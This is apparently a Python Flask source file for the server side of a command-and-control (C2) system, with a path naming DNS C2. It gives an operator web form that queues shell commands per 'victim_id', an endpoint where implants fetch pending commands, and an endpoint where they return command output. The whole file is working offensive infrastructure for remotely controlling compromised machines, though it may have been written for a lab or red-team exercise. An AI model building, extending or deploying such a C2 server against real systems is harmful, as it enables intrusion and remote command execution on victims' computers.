from flask import Flask, request, render_template, jsonify
import json
import os
import time
from datetime import datetime

app = Flask(__name__)
QUEUE_FILE = "/dns-c2/server/command_queue.json"

# Ensure queue file directory exists
os.makedirs(os.path.dirname(QUEUE_FILE), exist_ok=True)

# 사용자 정의 Jinja2 필터 정의
def datetime_filter(timestamp):
    """유닉스 타임스탬프를 읽기 쉬운 날짜/시간 형식으로 변환"""
    return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')

# Jinja2 환경에 필터 등록
app.jinja_env.filters['datetime'] = datetime_filter

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        victim_id = request.form.get("victim_id")
        command = request.form.get("command")
        
        if victim_id and command:
            queue = {}
            if os.path.exists(QUEUE_FILE):
                with open(QUEUE_FILE, "r") as f:
                    try:
                        queue = json.load(f)
                    except json.JSONDecodeError:
                        pass
            
            if victim_id not in queue:
                queue[victim_id] = []
            queue[victim_id].append({"command": command, "status": "pending", "timestamp": time.time()})
            
            with open(QUEUE_FILE, "w") as f:
                json.dump(queue, f, indent=2)
            
            return render_template("index.html", message=f"Command '{command}' queued for victim {victim_id}")
        return render_template("index.html", message="Please provide both victim ID and command")
    
    queue = {}
    if os.path.exists(QUEUE_FILE):
        with open(QUEUE_FILE, "r") as f:
            try:
                queue = json.load(f)
            except json.JSONDecodeError:
                pass
    return render_template("index.html", message="", queue=queue)

@app.route("/api/results/<victim_id>", methods=["POST"])
def submit_result(victim_id):
    data = request.json
    command = data.get("command")
    result = data.get("result")
    if command and result:
        queue = {}
        if os.path.exists(QUEUE_FILE):
            with open(QUEUE_FILE, "r") as f:
                try:
                    queue = json.load(f)
                except json.JSONDecodeError:
                    pass
        if victim_id not in queue:
            queue[victim_id] = []
        queue[victim_id].append({
            "command": command,
            "status": "completed",
            "result": result,
            "timestamp": time.time()
        })
        with open(QUEUE_FILE, "w") as f:
            json.dump(queue, f, indent=2)
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Invalid data"}), 400

@app.route("/api/commands/<victim_id>", methods=["GET"])
def get_commands(victim_id):
    session_id = request.args.get("session_id")
    queue = {}
    if os.path.exists(QUEUE_FILE):
        with open(QUEUE_FILE, "r") as f:
            try:
                queue = json.load(f)
            except json.JSONDecodeError:
                pass
    commands = []
    if victim_id in queue:
        for cmd in queue[victim_id]:
            if cmd["status"] == "pending" and (not session_id or cmd.get("session_id") == session_id):
                commands.append(cmd["command"])
        for cmd in queue[victim_id]:
            if not session_id or cmd.get("session_id") == session_id:
                cmd["status"] = "executed"
        with open(QUEUE_FILE, "w") as f:
            json.dump(queue, f, indent=2)
    return jsonify({"commands": commands})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
